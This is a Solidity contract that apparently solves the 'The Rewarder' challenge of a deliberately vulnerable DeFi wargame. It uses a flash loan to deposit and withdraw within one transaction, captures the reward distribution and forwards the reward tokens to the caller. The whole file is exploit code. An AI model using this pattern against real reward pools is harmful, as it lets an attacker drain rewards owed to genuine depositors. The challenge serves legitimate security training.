// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './FlashLoanerPool.sol';
import './TheRewarderPool.sol';
import '../DamnValuableToken.sol';

contract AttackerRewarder {
    address immutable lenderPool;
    address immutable rewarderPool;
    address immutable liquidityToken;
    address immutable rewardToken;

    constructor(
        address _lenderPool, 
        address _rewarderPool,
        address _liquidityToken,
        address _rewardToken
    ) {
        lenderPool = _lenderPool;
        rewarderPool = _rewarderPool;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
    }

    function attack(uint amount) external {
        FlashLoanerPool(lenderPool).flashLoan(amount);
        
        uint balance = ERC20(rewardToken).balanceOf(address(this));
        ERC20(rewardToken).transfer(msg.sender, balance);
    }

    function receiveFlashLoan(uint256 amount) external {
        ERC20(liquidityToken).approve(rewarderPool, amount);
        TheRewarderPool(rewarderPool).deposit(amount);
        TheRewarderPool(rewarderPool).withdraw(amount);
        ERC20(liquidityToken).transfer(lenderPool, amount);
    }
}